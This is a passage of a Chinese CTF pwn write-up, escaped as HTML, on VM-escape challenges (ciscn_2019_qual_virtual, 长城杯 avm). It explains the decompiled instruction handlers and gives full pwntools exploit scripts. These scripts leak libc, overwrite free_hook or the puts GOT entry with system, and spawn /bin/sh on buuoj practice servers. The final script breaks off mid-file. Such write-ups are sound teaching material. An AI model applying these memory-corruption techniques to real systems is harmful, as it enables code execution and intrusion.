:u64(data.ljust(8,b&amp;#39;\x00&amp;#39;))&#xA;# lg      = lambda s,addr&#x9;&#x9;        : log.info(&amp;#39;\033[1;31;40m %s --&amp;gt; 0x%x \033[0m&amp;#39; % (s,addr))&#xA;lg      = lambda s&#x9;&#x9;&#x9;        : log.info(&amp;#39;\033[1;31;40m %s --&amp;gt; 0x%x \033[0m&amp;#39; % (s, eval(s)))&#xA;l64     = lambda                    :u64(p.recvuntil(&amp;#34;\x7f&amp;#34;)[-6:].ljust(8,b&amp;#34;\x00&amp;#34;))&#xA;l32     = lambda                    :u32(p.recvuntil(&amp;#34;\xf7&amp;#34;)[-4:].ljust(4,b&amp;#34;\x00&amp;#34;))&#xA;r64     = lambda                    :u64(p.recv(6).ljust(8,b&amp;#39;\x00&amp;#39;))&#xA;ir64    = lambda                    :int(p.recv(14),16)&#xA;#-----------------------------------------------------------------&#xA;gdbscript = \&#xA;&amp;#34;&amp;#34;&amp;#34;&#xA;    sbase 0x202060&#xA;    sbase 0x202460&#xA;    c&#xA;&amp;#34;&amp;#34;&amp;#34;&#xA;if len(sys.argv) &amp;gt; 1 and sys.argv[1] == &amp;#34;r&amp;#34;:&#xA;    p = remote(&amp;#34;node5.buuoj.cn&amp;#34;,29198 )&#xA;elif len(sys.argv) &amp;gt; 1 and sys.argv[1] == &amp;#34;d&amp;#34;:&#xA;    p = gdb.debug(address, gdbscript = gdbscript)&#xA;else:&#xA;    p = process(address)&#xA;&#xA;def dbg():&#xA;    gdb.attach(p)&#xA;    # gdb.attach(p, gdbscript=gdbscript)&#xA;    # pause()&#xA;&#xA;&#xA;#def opcode(op,high,medium,low):&#xA;#    pl = (op &amp;lt;&amp;lt; 24) &amp;#43; (high &amp;lt;&amp;lt; 16) &amp;#43; (medium &amp;lt;&amp;lt; 8) &amp;#43; (low)&#xA;#    print(&amp;#34;---&amp;gt;&amp;#34;,hex(pl))&#xA;#    sl(str(pl))&#xA;&#xA;&#xA;#sla(b&amp;#34;PC: &amp;#34;,str(0))&#xA;#sla(b&amp;#34;SP: &amp;#34;,str(1))&#xA;#sla(b&amp;#34;CODE SIZE: &amp;#34;,str(4))&#xA;#ru(b&amp;#34;CODE: &amp;#34;)&#xA;&#xA;##create a stderr address in reg array&#xA;#opcode(0x10,0,0,26)     #mov reg[0],26&#xA;#opcode(0x80,2,1,0)      #reg[2]=reg[1]-reg[0]&#xA;#opcode(0x30,4,0,2)      #mov reg[4],memory[reg[2]]&#xA;&#xA;class VM:&#xA;    def __init__(self):&#xA;        self.instructions = []&#xA;    &#xA;    def opcode(self, op, high, medium, low):&#xA;        self.instructions.append((op &amp;lt;&amp;lt; 24) | (high &amp;lt;&amp;lt; 16) | (medium &amp;lt;&amp;lt; 8) | low)&#xA;    &#xA;    def send_all(self):&#xA;        sla(b&amp;#34;PC: &amp;#34;, &amp;#34;0&amp;#34;)&#xA;        sla(b&amp;#34;SP: &amp;#34;, &amp;#34;0&amp;#34;)&#xA;        sla(b&amp;#34;CODE SIZE: &amp;#34;, str(len(self.instructions)))&#xA;        ru(b&amp;#34;CODE: &amp;#34;)&#xA;        for instr in self.instructions:&#xA;            sl(str(instr))&#xA;&#xA;# - 0x10：mov reg[high]，low&#xA;# - 0x20：mov reg[high]，0&#xA;# - 0x30：mov reg[high]，memory[reg[low]]&#xA;# - 0x40：mov memory[reg[low]]，reg[high]&#xA;# - 0x50：PUSH：push reg[high] ，sp&amp;#43;&amp;#43;&#xA;# - 0x60：POP： pop[high]，sp--&#xA;# - 0x70：ADD： reg[high] = reg[low] &amp;#43; reg[medium]&#xA;# - 0x80：SUB：reg[high] = reg[medium] - reg[low]&#xA;# - 0x90：AND： reg[high] = reg[low] &amp;amp; reg[medium]&#xA;# - 0xa0：OR：reg[high] = reg[low] | reg[medium]&#xA;# - 0xb0：XOR：reg[high] = reg[low] ^ reg[medium]&#xA;# - 0xc0：SHL：reg[high] = reg[medium] &amp;lt;&amp;lt; reg[low]&#xA;# - 0xd0：SHR：reg[high] = reg[medium] &amp;gt;&amp;gt; reg[low]&#xA;# - 0xe0：EXIT：停止执行&#xA;&#xA;# 使用示例&#xA;vm = VM()&#xA;#create a stderr address in reg array&#xA;#负数偏移指向stderr&#xA;vm.opcode(0x10, 0, 0, 26)   #mov reg[0], 26 &#xA;vm.opcode(0x80, 2, 1, 0)    #reg[2] = reg[1]-reg[0] = FFFFFFE6&#xA;vm.opcode(0x30, 4, 0, 2)    #mov reg[4],memory[reg[2]]&#xA;vm.opcode(0x10,0,0,25)     #mov reg[0],25&#xA;vm.opcode(0x80,2,1,0)      #reg[2]=reg[1]-reg[0]&#xA;vm.opcode(0x30,5,0,2)      #mov reg[5],memory[reg[2]]  reg[4][5]---&amp;gt;stderr address&#xA;&#xA;# create free_hook address through stderr address&#xA;# stderr &amp;#43; 0x10a0 = free_hook - 0x8&#xA;vm.opcode(0x10,2,0,0x10)     #mov reg[2],0x10&#xA;vm.opcode(0x10,0,0,8)      #mov reg[0],8&#xA;vm.opcode(0xc0,1,2,0)      #reg[1]=sal reg[2],8&#xA;&#xA;vm.opcode(0x10,2,0,0xa0)   #mov reg[2],0xa0&#xA;vm.opcode(0x70,1,1,2)      #add reg[1],reg[2]&#xA;vm.opcode(0x70,4,4,1)      #add reg[4],reg[1]    reg[4][5]---&amp;gt;free_hook address-8&#xA;&#xA;# let pointer comment point to free_hook&#xA;vm.opcode(0x10,0,0,0x8)     #mov reg[0],8&#xA;vm.opcode(0x80,2,7,0)      #reg[2]=reg[7]-reg[0] = FFFFFFF8&#xA;vm.opcode(0x40,4,0,2)      #mov memory[reg[2]],reg[4]&#xA;vm.opcode(0x10,0,0,0x7)     #mov reg[0],9&#xA;vm.opcode(0x80,2,7,0)      #reg[2]=reg[7]-reg[0]&#xA;vm.opcode(0x40,5,0,2)      #mov memory[reg[2]],reg[5]&#xA;vm.send_all()&#xA;&#xA;p.recvuntil(&amp;#34;R4: &amp;#34;)&#xA;addr1=int(p.recv(8),16)&#xA;p.recvuntil(&amp;#34;R5: &amp;#34;)&#xA;addr2=int(p.recv(4),16)&#xA;sys_addr=addr1&amp;#43;((addr2)&amp;lt;&amp;lt;32)-0x381410&#xA;lg(&amp;#34;sys_addr&amp;#34;)&#xA;# dbg()&#xA;p.sendafter(&amp;#34;HOW DO YOU FEEL AT OVM?\n&amp;#34;,b&amp;#39;/bin/sh\x00&amp;#39;&amp;#43;p64(sys_addr))&#xA;&#xA;&#xA;itr()&lt;/code&gt;&lt;/pre&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;ciscn_2019_qual_virtual&#34;&gt;&lt;span&gt;ciscn_2019_qual_virtual&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#ciscn_2019_qual_virtual&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h2&gt;&lt;p&gt;先分配几个堆块&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;  s = malloc(0x20u);                            // name&#xA;  data = alloc(0x40);&#xA;  text = alloc(0x80);&#xA;  stack = alloc(0x40);&#xA;  ptr = malloc(0x400u);&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;输入数据，将指令转成opcode，数据写入data&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;  puts(&amp;#34;Your program name:&amp;#34;);&#xA;  input(s, 32);&#xA;  puts(&amp;#34;Your instruction:&amp;#34;);&#xA;  input(ptr, 0x400);&#xA;  get_opcode_numnber(text, ptr);&#xA;  puts(&amp;#34;Your stack data:&amp;#34;);&#xA;  input(ptr, 0x400);&#xA;  get_data(data, ptr);&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;交互方式大致为：&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;sla(b&amp;#39;name:\n&amp;#39;,b&amp;#39;j4f&amp;#39;)&#xA;sla(b&amp;#39;instruction:\n&amp;#39;,b&amp;#39;push push push add pop&amp;#39;)&#xA;sla(b&amp;#39;stack data:\n&amp;#39;,b&amp;#39;2 4 6&amp;#39;)&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;指令：&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;push: push数据，后push的在伪造stack的高地址&#xA;pop：stack高地址的数据，给data的低地址&#xA;add: stack两个高地址的数据相加，存在stack次高地址处&#xA;sub：stack两个高地址的数据相减(高地址减次高地址)，存在stack次高地址处&#xA;mul: stack两个高地址的数据相乘，存在stack次高地址处&#xA;div: stack两个高地址的数据相除，存在stack次高地址处&#xA;load: 往stack_data &amp;#43; flag &amp;#43; 偏移处，写入基于stack_data某偏移内容&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;load指令：&lt;/p&gt;&#xA;&lt;p&gt;存数据到栈顶&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;// load&#xA;__int64 __fastcall sub_401CCE(alloc_heap *stack, __int64 data)&#xA;{&#xA;  __int64 v3; // [rsp&amp;#43;10h] [rbp-10h] BYREF&#xA;&#xA;  if ( (unsigned int)give_v1_2_v2(stack, &amp;amp;v3) ) //这里会把flag-1&#xA;    return give_v2_2_V1(stack, *((_QWORD *)stack-&amp;gt;data_ptr &amp;#43; stack-&amp;gt;flag &amp;#43; v3)); //这里flag&amp;#43;1&#xA;  else&#xA;    return 0;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;把&lt;code&gt;*((_QWORD *)stack-&amp;gt;data_ptr + stack-&amp;gt;flag + v3))&lt;/code&gt;的值给栈顶&lt;/p&gt;&#xA;&lt;p&gt;注意flag - 1&lt;/p&gt;&#xA;&lt;p&gt;save指令：&lt;/p&gt;&#xA;&lt;p&gt;写数据到&lt;code&gt;*((_QWORD *)stack-&amp;gt;data_ptr + stack-&amp;gt;flag + v3)&lt;/code&gt;中&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;// save&#xA;__int64 __fastcall sub_401D37(alloc_heap *stack, __int64 data)&#xA;{&#xA;  __int64 v3; // [rsp&amp;#43;10h] [rbp-10h] BYREF&#xA;  __int64 v4; // [rsp&amp;#43;18h] [rbp-8h] BYREF&#xA;&#xA;  if ( !(unsigned int)give_v1_2_v2(stack, &amp;amp;v3) || !(unsigned int)give_v1_2_v2(stack, &amp;amp;v4) ) //注意这里会把flag -2 &#xA;    return 0;&#xA;  *((_QWORD *)stack-&amp;gt;data_ptr &amp;#43; stack-&amp;gt;flag &amp;#43; v3) = v4;&#xA;  return 1;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;先push的是v4&lt;/p&gt;&#xA;&lt;p&gt;注意flag -2&lt;/p&gt;&#xA;&lt;p&gt;execute完之后，会&lt;code&gt;puts(s);&lt;/code&gt;，这里把puts_got改成system，s写入/bin/sh&lt;/p&gt;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;exp-1&#34;&gt;&lt;span&gt;exp&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#exp-1&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h3&gt;&lt;pre&gt;&lt;code&gt;from pwn import *&#xA;context.terminal = [&amp;#34;tmux&amp;#34;, &amp;#34;splitw&amp;#34;, &amp;#34;-h&amp;#34;]&#xA;context(os=&amp;#39;linux&amp;#39;,arch=&amp;#39;amd64&amp;#39;,log_level=&amp;#39;debug&amp;#39;)&#xA;&#xA;address = &amp;#39;./pwn&amp;#39;&#xA;# address = &amp;#39;./pwn_patched&amp;#39;&#xA;elf = ELF(address)&#xA;libc = elf.libc&#xA;&#xA;#-----------------------------------------------------------------&#xA;s       = lambda data               :p.send(data)&#xA;ss      = lambda data               :p.send(str(data))&#xA;sa      = lambda delim,data         :p.sendafter(str(delim), data)&#xA;sl      = lambda data               :p.sendline(data)&#xA;sls     = lambda data               :p.sendline(str(data))&#xA;sla     = lambda delim,data         :p.sendlineafter(delim, data)&#xA;r       = lambda num                :p.recv(num)&#xA;ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)&#xA;itr     = lambda                    :p.interactive()&#xA;uu32    = lambda data               :u32(data.ljust(4,b&amp;#39;\x00&amp;#39;))&#xA;uu64    = lambda data               :u64(data.ljust(8,b&amp;#39;\x00&amp;#39;))&#xA;# lg      = lambda s,addr&#x9;&#x9;        : log.info(&amp;#39;\033[1;31;40m %s --&amp;gt; 0x%x \033[0m&amp;#39; % (s,addr))&#xA;lg      = lambda s&#x9;&#x9;&#x9;        : log.info(&amp;#39;\033[1;31;40m %s --&amp;gt; 0x%x \033[0m&amp;#39; % (s, eval(s)))&#xA;l64     = lambda                    :u64(p.recvuntil(&amp;#34;\x7f&amp;#34;)[-6:].ljust(8,b&amp;#34;\x00&amp;#34;))&#xA;l32     = lambda                    :u32(p.recvuntil(&amp;#34;\xf7&amp;#34;)[-4:].ljust(4,b&amp;#34;\x00&amp;#34;))&#xA;r64     = lambda                    :u64(p.recv(6).ljust(8,b&amp;#39;\x00&amp;#39;))&#xA;ir64    = lambda                    :int(p.recv(14),16)&#xA;#-----------------------------------------------------------------&#xA;gdbscript = \&#xA;&amp;#34;&amp;#34;&amp;#34;&#xA;    b *0x401332&#xA;    c&#xA;&amp;#34;&amp;#34;&amp;#34;&#xA;if len(sys.argv) &amp;gt; 1 and sys.argv[1] == &amp;#34;r&amp;#34;:&#xA;    p = remote(&amp;#34;node5.buuoj.cn&amp;#34;,29332 )&#xA;elif len(sys.argv) &amp;gt; 1 and sys.argv[1] == &amp;#34;d&amp;#34;:&#xA;    p = gdb.debug(address, gdbscript = gdbscript)&#xA;else:&#xA;    p = process(address)&#xA;&#xA;def dbg():&#xA;    # gdb.attach(p)&#xA;    gdb.attach(p, gdbscript=gdbscript)&#xA;    # pause()&#xA;&#xA;# data 0x200&#xA;# text  0x400&#xA;# stack 0x200&#xA;# instruction 0x400&#xA;&#xA;p.sendlineafter(&amp;#34;Your program name:\n&amp;#34;,&amp;#34;/bin/sh\x00&amp;#34;)&#xA;p.sendlineafter(&amp;#34;Your instruction:\n&amp;#34;,&amp;#34;push push save push load push add push save&amp;#34;)&#xA;p.sendlineafter(&amp;#34;Your stack data:\n&amp;#34;,&amp;#34;4210896 -3 -21 -172800 -21&amp;#34;)&#xA;&#xA;&#xA;itr()&lt;/code&gt;&lt;/pre&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;长城杯pwnavm&#34;&gt;&lt;span&gt;长城杯pwn&amp;mdash;avm&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#%e9%95%bf%e5%9f%8e%e6%9d%afpwnavm&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h2&gt;&lt;p&gt;文章及附件：https://bbs.kanxue.com/thread-284826.htm&lt;/p&gt;&#xA;&lt;p&gt;这里我直接拿我本地的libc做了&lt;/p&gt;&#xA;&lt;p&gt;vm结构体&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;struct vm_struct&#xA;{&#xA;  _QWORD reg[32];&#xA;  _QWORD rip;&#xA;  _QWORD opcode;&#xA;  _QWORD num;&#xA;};&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;交互：&lt;/p&gt;&#xA;&lt;p&gt;一条指令32个bit，最高4个bit作为instruction，0-4、5-9、16-20作为low,medium,high&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;def op(opcode,high,medium,low):&#xA;    ope = p32(opcode&amp;lt;&amp;lt;28 | (high&amp;amp;0x1f)&amp;lt;&amp;lt;16 | (medium&amp;amp;0x1f)&amp;lt;&amp;lt;5 | (low&amp;amp;0x1f))&#xA;    return ope&#xA;&#xA;def add(high,medium,low):&#xA;    ret op(1,high,medium,low)&#xA;&#xA;def load(offset,medium,src,opcode=9):&#xA;    ope = p32(opcode&amp;lt;&amp;lt;28 | (offset&amp;amp;0xfff)&amp;lt;&amp;lt;16 | (medium&amp;amp;0x1f)&amp;lt;&amp;lt;5 | (src&amp;amp;0x1f))&#xA;    return ope&#xA;&#xA;def store(offset,medium,dest,opcode=10):&#xA;    ope = p32(opcode&amp;lt;&amp;lt;28 | (offset&amp;amp;0xfff)&amp;lt;&amp;lt;16 | (medium&amp;amp;0x1f)&amp;lt;&amp;lt;5 | (dest&amp;amp;0x1f))&#xA;    return ope&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;指令:&lt;/p&gt;&#xA;&lt;p&gt;4个字节一个指令&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;add: low = high &amp;#43; medium&#xA;sub: low = medium - high&#xA;mul: low = high*medium&#xA;div: low = medium/high&#xA;xor: low = high^medium&#xA;and: low = high&amp;amp;medium&#xA;shl: low = medium&amp;lt;&amp;lt;high&#xA;shr: low = medium&amp;gt;&amp;gt;high&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;load：把low寄存器中的内容，写到某栈地址+medium寄存器内容+偏移处&lt;/p&gt;&#xA;&lt;p&gt;这里low和medium不要是同一寄存器&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;unsigned __int64 __fastcall load(vm_struct *vm_struct, __int64 stack)&#xA;{&#xA;  unsigned __int64 result; // rax&#xA;  unsigned int v3; // [rsp&amp;#43;20h] [rbp-20h]&#xA;  _QWORD *v4; // [rsp&amp;#43;30h] [rbp-10h]&#xA;&#xA;  v3 = *(_DWORD *)(vm_struct-&amp;gt;opcode &amp;#43; (vm_struct-&amp;gt;rip &amp;amp; 0xFFFFFFFFFFFFFFFCLL));&#xA;  vm_struct-&amp;gt;rip &amp;#43;= 4LL;&#xA;  result = (unsigned __int8)byte_4010;          // 0xff&#xA;  if ( (unsigned __int8)(vm_struct-&amp;gt;reg[(v3 &amp;gt;&amp;gt; 5) &amp;amp; 0x1F] &amp;#43; BYTE2(v3)) &amp;lt; (unsigned __int8)byte_4010 )&#xA;  {&#xA;    v4 = (_QWORD *)((unsigned __int16)(vm_struct-&amp;gt;reg[(v3 &amp;gt;&amp;gt; 5) &amp;amp; 0x1F] &amp;#43; (HIWORD(v3) &amp;amp; 0xFFF)) &amp;#43; stack);&#xA;    *v4 = vm_struct-&amp;gt;reg[v3 &amp;amp; 0x1F];&#xA;    return (unsigned __int64)v4;&#xA;  }&#xA;  return result;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;store：把某栈地址+medium寄存器内容+偏移处的8字节，给low寄存器&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;vm_struct *__fastcall mov(vm_struct *vm_struct, __int64 a2)&#xA;{&#xA;  vm_struct *vm_struct_1; // rax&#xA;  unsigned __int16 v3; // [rsp&amp;#43;1Eh] [rbp-22h]&#xA;  unsigned int v4; // [rsp&amp;#43;20h] [rbp-20h]&#xA;&#xA;  v4 = *(_DWORD *)(vm_struct-&amp;gt;opcode &amp;#43; (vm_struct-&amp;gt;rip &amp;amp; 0xFFFFFFFFFFFFFFFCLL));&#xA;  vm_struct-&amp;gt;rip &amp;#43;= 4LL;&#xA;  vm_struct_1 = (vm_struct *)(unsigned __int8)byte_4010;&#xA;  if ( (unsigned __int8)(vm_struct-&amp;gt;reg[(v4 &amp;gt;&amp;gt; 5) &amp;amp; 0x1F] &amp;#43; BYTE2(v4)) &amp;lt; (unsigned __int8)byte_4010 )// 0xff&#xA;  {&#xA;    vm_struct_1 = vm_struct;&#xA;    v3 = vm_struct-&amp;gt;reg[(v4 &amp;gt;&amp;gt; 5) &amp;amp; 0x1F] &amp;#43; (HIWORD(v4) &amp;amp; 0xFFF);&#xA;    vm_struct-&amp;gt;reg[v4 &amp;amp; 0x1F] = ((unsigned __int64)*(unsigned __int8 *)(v3 &amp;#43; a2 &amp;#43; 7) &amp;lt;&amp;lt; 56)&#xA;                              | ((unsigned __int64)*(unsigned __int8 *)(v3 &amp;#43; a2 &amp;#43; 6) &amp;lt;&amp;lt; 48)&#xA;                              | ((unsigned __int64)*(unsigned __int8 *)(v3 &amp;#43; a2 &amp;#43; 5) &amp;lt;&amp;lt; 40)&#xA;                              | ((unsigned __int64)*(unsigned __int8 *)(v3 &amp;#43; a2 &amp;#43; 4) &amp;lt;&amp;lt; 32)&#xA;                              | ((unsigned __int64)*(unsigned __int8 *)(v3 &amp;#43; a2 &amp;#43; 3) &amp;lt;&amp;lt; 24)&#xA;                              | ((unsigned __int64)*(unsigned __int8 *)(v3 &amp;#43; a2 &amp;#43; 2) &amp;lt;&amp;lt; 16)&#xA;                              | *(unsigned __int16 *)(v3 &amp;#43; a2);&#xA;  }&#xA;  return vm_struct_1;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;思路-1&#34;&gt;&lt;span&gt;思路&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#%e6%80%9d%e8%b7%af-1&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h3&gt;&lt;ul&gt;&#xA;&lt;li&gt;把栈上的libc地址存在vm_struct的寄存器中&lt;/li&gt;&#xA;&lt;li&gt;因为我们的opcode是存在栈上的，所以在opcode的末尾可以加上我们自己的东西&lt;/li&gt;&#xA;&lt;li&gt;把寄存器的libc地址，加减我们写入opcode末尾的偏移，构造rop链&lt;/li&gt;&#xA;&lt;li&gt;把rop链写入栈中返回地址处&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;exp-2&#34;&gt;&lt;span&gt;exp&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#exp-2&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h3&gt;&lt;pre&gt;&lt;code&gt;from pwn import *&#xA;context.terminal = [&amp;#34;tmux&amp;#34;, &amp;#34;splitw&amp;#34;, &amp;#34;-h&amp;#34;]&#xA;context(os=&amp;#39;linux&amp;#39;,arch=&amp;#39;amd64&amp;#39;,log_level=&amp;#39;debug&amp;#39;)&#xA;&#xA;address = &amp;#39;./pwn1&amp;#39;&#xA;# address = &amp;#39;./pwn_patched&amp;#39;&#xA;elf = ELF(address)&#xA;libc = elf.libc&#xA;&#xA;#-----------------------------------------------------------------&#xA;s       = lambda data               :p.send(data)&#xA;ss      = lambda data               :p.send(str(data))&#xA;sa      = lambda delim,data         :p.sendafter(str(delim), data)&#xA;sl      = lambda data               :p.sendline(data)&#xA;sls     = lambda data               :p.sendline(str(data))&#xA;sla     = lambda delim,data         :p.sendlineafter(delim, data)&#xA;r       = lambda num                :p.recv(num)&#xA;ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)&#xA;itr     = lambda                    :p.interactive()&#xA;uu32    = lambda data               :u32(data.ljust(4,b&amp;#39;\x00&amp;#39;))&#xA;uu64    = lambda data               :u64(data.ljust(8,b&amp;#39;\x00&amp;#39;))&#xA;# lg      = lambda s,addr&#x9;&#x9;        : log.info(&amp;#39;\033[1;31;40m %s --&amp;gt; 0x%x \033[0m&amp;#39; % (s,addr))&#xA;lg      = lambda s&#x9;&#x9;&#x9;        : log.info(&amp;#39;\033[1;31;40m %s --&amp;gt; 0x%x \033[0m&amp;#39; % (s, eval(s)))&#xA;l64     = lambda                    :u64(p.recvuntil(&amp;#34;\x7f&amp;#34;)[-6:].ljust(8,b&amp;#34;\x00&amp;#34;))&#xA;l32     = lambda                    :u32(p.recvuntil(&amp;#34;\xf7&amp;#34;)[-4:].ljust(4,b&amp;#34;\x00&amp;#34;))&#xA;r64     = lambda                    :u64(p.recv(6).ljust(8,b&amp;#39;\x00&amp;#39;))&#xA;ir64    = lambda                    :int(p.recv(14),16)&#xA;#-----------------------------------------------------------------&#xA;gdbscript = \&#xA;&amp;#34;&amp;#34;&amp;#34;&#xA;    # bbase 0x1b70&#xA;    # bbase 0x1AFB #Unsupported instruction的leave;ret&#xA;    bbase 0x1aad&#xA;    c&#xA;&amp;#34;&amp;#34;&amp;#34;&#xA;if len(sys.argv) &amp;gt; 1 and sys.argv[1] == &amp;#34;r&amp;#34;:&#xA;    p = 